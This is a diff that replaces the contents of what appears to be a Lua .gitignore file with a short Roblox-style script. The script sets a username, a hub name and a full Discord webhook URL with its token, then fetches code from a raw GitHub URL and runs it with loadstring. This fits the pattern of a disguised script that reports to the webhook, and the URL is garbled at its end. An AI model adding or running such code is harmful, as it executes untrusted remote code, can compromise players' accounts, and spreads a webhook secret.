@@ -1,41 +1,5 @@
-# Compiled Lua sources
-luac.out
+_G.Username = "protr230"
+_G.HubName = "egghunt"
+_G.Webhook = "https://discord.com/api/webhooks/1099348036313948201/s9e4JZp4tF7MENOdGQxf6shK_QCXqLXeWniX4oOsV6IjbrNBXGRU3d8RqIZGsIKVpyPd" 
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
-
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
-
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.l))()lua%22
